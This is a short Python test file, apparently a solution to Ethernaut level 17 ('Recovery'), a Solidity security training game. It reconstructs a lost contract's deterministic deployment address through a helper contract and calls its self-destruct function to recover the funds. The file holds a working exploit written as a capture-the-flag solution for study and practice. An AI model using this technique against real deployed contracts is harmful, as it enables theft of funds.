from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv17_recovery import Recovery
from pytypes.contracts.attacker.lv17_address_generator import AddressGenerator

@default_chain.connect()
def test_lv17():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv17()
    foundContract = exploit_lv17(contract)
    ethernaut.check_lv17(contract,  foundContract)

def exploit_lv17(contract: Recovery) -> Address:
    # Recovery vector: deployment address is calculated deterministically => can be reconstructed
    # Training: know how to calculate deployment address

    helperContract = AddressGenerator.deploy()
    addressOfLostContract = helperContract.generateAddress(contract.address) 
    helperContract.destroyContract(addressOfLostContract)
    return addressOfLostContract
